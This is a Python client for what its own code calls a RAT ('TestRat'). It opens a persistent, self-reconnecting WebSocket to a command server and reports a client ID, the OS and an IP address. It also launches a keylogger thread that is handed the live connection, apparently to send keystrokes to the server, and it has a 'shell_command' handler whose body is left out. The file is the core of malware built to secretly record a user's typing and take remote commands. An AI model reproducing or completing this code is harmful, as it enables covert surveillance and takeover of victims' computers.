import json
import uuid
import time
import threading
import websocket

import util
import keylogger
import classes

SERVER_URL = "ws://localhost:8080/ws/seeker"
RECONNECT_DELAY = 5

seconds_disconnected = 0
client_uuid = None
should_reconnect = True
ws_holder = classes.WSHolder()

def on_message(ws, message):
    global should_reconnect
    print(f"[Server] {message}")
    try:
        data = json.loads(message)
        if data.get("type") == "shell_command":
            ...
        elif data.get("type") == "Disconnect":
            print(f"[Info] Received server-initiated disconnect: {data.get('data')}")
            should_reconnect = False
            ws.close()
            exit(0)
    except json.JSONDecodeError:
        print("[Error] Failed to decode server message.")


def on_error(ws, error):
    print(f"[WebSocket Error] {error}")


def on_close(ws, close_status_code, close_msg):
    print("[WebSocket] Connection closed.")


def on_open(ws):
    global seconds_disconnected, ws_holder
    ws_holder.ws = ws
    seconds_disconnected = 0
    print("[WebSocket] Connected.")

    rat_info = {
        "id": client_uuid,
        "name": "TestRat",
        "os": "Windows",
        "ip": "192.168.1.100",
        "metadata": {"version": "1.0"}
    }

    ws.send(json.dumps(rat_info))

def run_websocket():
    global seconds_disconnected, should_reconnect, ws_holder

    while should_reconnect:
        ws = websocket.WebSocketApp(
            SERVER_URL,
            on_open=on_open,
            on_message=on_message,
            on_error=on_error,
            on_close=on_close
        )

        ws.run_forever()

        if not should_reconnect:
            print("[Info] Server-initiated disconnect received, not reconnecting.")
            break

        seconds_disconnected += RECONNECT_DELAY
        print(f"[Reconnect] Lost connection. Retrying in {RECONNECT_DELAY}s (disconnected for {seconds_disconnected}s)...")
        time.sleep(RECONNECT_DELAY)

def main():
    global client_uuid

    args = util.parse_arguments()
    client_uuid = args.uuid or str(uuid.uuid4())
    print(f"[Info] Using UUID: {client_uuid}")

    keylogger_thread = threading.Thread(target=keylogger.start, args=(ws_holder,), daemon=True)
    keylogger_thread.start()

    thread = threading.Thread(target=run_websocket, daemon=True)
    thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[Shutdown] Exiting client.")

if __name__ == "__main__":
    main()